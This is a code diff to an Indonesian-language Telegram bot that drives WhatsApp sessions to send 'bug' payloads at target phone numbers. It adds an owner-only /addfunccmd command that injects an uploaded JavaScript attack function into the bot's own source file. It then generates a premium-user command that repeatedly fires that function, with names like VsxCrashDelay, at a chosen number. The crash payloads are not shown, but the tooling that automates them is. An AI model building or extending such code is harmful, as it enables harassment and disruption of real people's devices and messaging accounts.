@@ -622,7 +622,7 @@ async function performFullUpdate(chatId) {
   }
 }
 
-// ================= FITUR ADD FUNC ================= //
+// ================= FITUR ADD FUNC CMD ================= //
 
 async function addNewFunctionToFile(functionBody, functionName) {
   try {
@@ -637,7 +637,7 @@ async function addNewFunctionToFile(functionBody, functionName) {
     
     const existingFunctionCheck = new RegExp(`async function ${functionName}\\s*\\(`, 'g');
     if (existingFunctionCheck.test(content)) {
-      return false;
+      return true;
     }
     
     const lines = content.split('\n');
@@ -646,7 +646,7 @@ async function addNewFunctionToFile(functionBody, functionName) {
       if (lines[i].startsWith('async function') || (lines[i].includes('async function') && lines[i].includes('{'))) {
         lastFunctionLine = i;
       }
-      if (lines[i].startsWith('// ================= HELPER FUNCTIONS')) {
+      if (lines[i].includes('// ================= HELPER FUNCTIONS')) {
         break;
       }
     }
@@ -662,41 +662,100 @@ async function addNewFunctionToFile(functionBody, functionName) {
   }
 }
 
-async function updateCommandFunction(commandName, loopCount, sleepMs, functionCalls) {
+async function addNewCommand(cmdName, loopCount, sleepMs, functionName) {
   try {
     let content = fs.readFileSync(__filename, "utf8");
     
-    const commandRegex = new RegExp(`bot\\.onText\\(\\/\\/${commandName}\\(\\?:\\s\\+(\\\\.+)\\)\\?/, async \\(msg, match\\) => \\{([\\s\\S]*?)\\n\\}\\);`, 'g');
+    const commandTemplate = `
+bot.onText(/\\/${cmdName}(?:\\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const botModeData = loadBotMode();
+  const groupOnlyData = loadGroupOnly();
+  
+  if (botModeData.mode === "on" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (checkCommandBlocked("${cmdName}", msg)) {
+    return;
+  }
+  
+  if (!isOwner(userId) && !isPremium(userId)) {
+    return;
+  }
+
+  if (!match[1]) {
+    return;
+  }
+
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const target = \`\${formattedNumber}@s.whatsapp.net\`;
+
+  try {
+    if (sessions.size === 0) {
+      return;
+    }
+
+    const sock = sessions.values().next().value;
     
-    const functionCallLines = functionCalls.split(',').map(f => f.trim());
+    await bot.sendMessage(chatId, \`✅ ${cmdName} (bug) selesai untuk \${formattedNumber}\`, {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 CEK TARGET", url: \`https://wa.me/\${formattedNumber}\` }]
+        ]
+      }
+    });
     
-    let loopBody = '';
-    for (const call of functionCallLines) {
-      loopBody += `      ${call}\n`;
-      loopBody += `      await sleep(${sleepMs});\n`;
+    for (let i = 0; i < ${loopCount}; i++) {
+      await ${functionName}(sock, target);
+      await sleep(${sleepMs});
+      console.log(chalk.green(\`✅ Success Sending to \${target}\`));
     }
     
-    const newLoopCode = `    for (let i = 0; i < ${loopCount}; i++) {\n${loopBody}    }`;
-    
-    const oldCommandMatch = content.match(commandRegex);
-    if (oldCommandMatch) {
-      const oldCode = oldCommandMatch[0];
-      const oldLoopRegex = /for \(let i = 0; i < \d+; i\+\+\) \{[\s\S]*?\n    \}/;
-      const newCode = oldCode.replace(oldLoopRegex, newLoopCode);
-      content = content.replace(oldCommandMatch[0], newCode);
-      
-      fs.writeFileSync(__filename, content);
-      return true;
-    }
-    
-    return false;
   } catch (error) {
-    console.error("Error updating command function:", error);
+    console.error("Error in ${cmdName}:", error);
+  }
+});`;
+
+    const menuButtonSection = "const mainMenuButtons = {";
+    const insertPoint = content.indexOf(menuButtonSection);
+    
+    if (insertPoint === -1) {
+      return false;
+    }
+    
+    const lines = content.split('\n');
+    lines.splice(insertPoint, 0, commandTemplate);
+    
+    fs.writeFileSync(__filename, lines.join('\n'));
+    
+    const menuTextOld = content.match(/const menuText = `([\\s\\S]*?)`;/);
+    if (menuTextOld) {
+      let newMenuText = menuTextOld[1];
+      const cmdLine = `│ ❀ /${cmdName} <number> - custom bug\n`;
+      const insertMenuPoint = newMenuText.indexOf('╰═════════════════❀');
+      if (insertMenuPoint !== -1) {
+        newMenuText = newMenuText.slice(0, insertMenuPoint) + cmdLine + newMenuText.slice(insertMenuPoint);
+        const newContent2 = content.replace(menuTextOld[0], `const menuText = \`${newMenuText}\`;`);
+        fs.writeFileSync(__filename, newContent2);
+      }
+    }
+    
+    return true;
+  } catch (error) {
+    console.error("Error adding new command:", error);
     return false;
   }
 }
 
-bot.onText(/\/addfuncfile (.+)/, async (msg, match) => {
+bot.onText(/\/addfunccmd (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   if (!isOwner(msg.from.id)) {
     await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
@@ -704,12 +763,12 @@ bot.onText(/\/addfuncfile (.+)/, async (msg, match) => {
   }
   
   const args = match[1].split(',');
-  if (args.length < 4) {
-    await bot.sendMessage(chatId, "❌ Format: /addfuncfile <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara: Reply ke file .js yang berisi fungsi, lalu ketik perintah ini.\nContoh: /addfuncfile sanjixa,5,1000,DelayKelrax");
+  if (args.length < 5) {
+    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara: Reply ke file .js yang berisi fungsi, lalu ketik perintah ini.\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
     return;
   }
   
-  const cmdName = args[0].trim();
+  const cmdName = args[0].trim().replace('/', '');
   const loopCount = parseInt(args[1].trim());
   const sleepMs = parseInt(args[2].trim());
   const functionName = args[3].trim();
@@ -747,65 +806,27 @@ bot.onText(/\/addfuncfile (.+)/, async (msg, match) => {
     const functionAdded = await addNewFunctionToFile(functionBody, functionName);
     
     if (!functionAdded) {
-      await bot.sendMessage(chatId, `❌ Gagal menambah fungsi. Mungkin fungsi "${functionName}" sudah ada?`);
+      await bot.sendMessage(chatId, `⚠️ Gagal menambah fungsi atau fungsi sudah ada.`);
+    } else {
+      await bot.sendMessage(chatId, `✅ Fungsi "${functionName}" berhasil ditambahkan ke index.js!`);
+    }
+    
+    const commandAdded = await addNewCommand(cmdName, loopCount, sleepMs, functionName);
+    
+    if (!commandAdded) {
+      await bot.sendMessage(chatId, `❌ Gagal menambah command /${cmdName}.`);
       return;
     }
     
-    await bot.sendMessage(chatId, `✅ Fungsi "${functionName}" berhasil ditambahkan ke index.js!`);
-    
-    const commandUpdated = await updateCommandFunction(cmdName, loopCount, sleepMs, `await ${functionName}(sock, target)`);
-    
-    if (!commandUpdated) {
-      await bot.sendMessage(chatId, `⚠️ Fungsi ditambahkan tapi gagal update command /${cmdName}. Cek apakah command ada.`);
-      return;
-    }
-    
-    await bot.sendMessage(chatId, `✅ Berhasil update command /${cmdName}!\n\nLoop: ${loopCount}x\nSleep: ${sleepMs}ms\nFunction: ${functionName}\n\nRestarting bot...`);
+    await bot.sendMessage(chatId, `✅ Berhasil menambah command /${cmdName}!\n\nCommand: /${cmdName}\nLoop: ${loopCount}x\nSleep: ${sleepMs}ms\nFunction: ${functionName}\n\nRestarting bot...`);
     
     setTimeout(() => {
       process.exit(0);
     }, 2000);
     
   } catch (error) {
-    console.error("Error in addfuncfile:", error);
+    console.error("Error in addfunccmd:", error);
     await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-  }
-});
-
-bot.onText(/\/addfunc (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
-    return;
-  }
-  
-  const args = match[1].split(',');
-  if (args.length < 4) {
-    await bot.sendMessage(chatId, "❌ Format: /addfunc <cmdName>,<loopCount>,<sleepMs>,<functionCall1,functionCall2,...>\nContoh: /addfunc streak,10,1000,await delaynewinvisibleVnX(sock, target),await VsxCrashDelay(sock, target)");
-    return;
-  }
-  
-  const cmdName = args[0].trim();
-  const loopCount = parseInt(args[1].trim());
-  const sleepMs = parseInt(args[2].trim());
-  const functionCalls = args.slice(3).join(',').trim();
-  
-  if (isNaN(loopCount) || isNaN(sleepMs)) {
-    await bot.sendMessage(chatId, "❌ loopCount dan sleepMs harus berupa angka!");
-    return;
-  }
-  
-  await bot.sendMessage(chatId, `🔄 Mengupdate command /${cmdName} dengan loop ${loopCount}x dan sleep ${sleepMs}ms...`);
-  
-  const success = await updateCommandFunction(cmdName, loopCount, sleepMs, functionCalls);
-  
-  if (success) {
-    await bot.sendMessage(chatId, `✅ Berhasil mengupdate command /${cmdName}!\n\nRestarting bot...`);
-    setTimeout(() => {
-      process.exit(0);
-    }, 2000);
-  } else {
-    await bot.sendMessage(chatId, `❌ Gagal mengupdate command /${cmdName}. Pastikan command tersebut ada.`);
   }
 });
 
@@ -1444,8 +1465,7 @@ bot.onText(/\/menu/, async (msg) => {
 │ ❀ /runcmd <command>
 │ ❀ /fullupdate - update dari GitHub
 │ ❀ /cekupdate - cek update GitHub
-│ ❀ /addfunc <cmd>,<loop>,<sleep>,<func> - update loop
-│ ❀ /addfuncfile <cmd>,<loop>,<sleep>,<funcName> - upload & inject fungsi
+│ ❀ /addfunccmd - tambah cmd bug baru dari file
 ╰═════════════════❀\`\`\``;
 
   try {
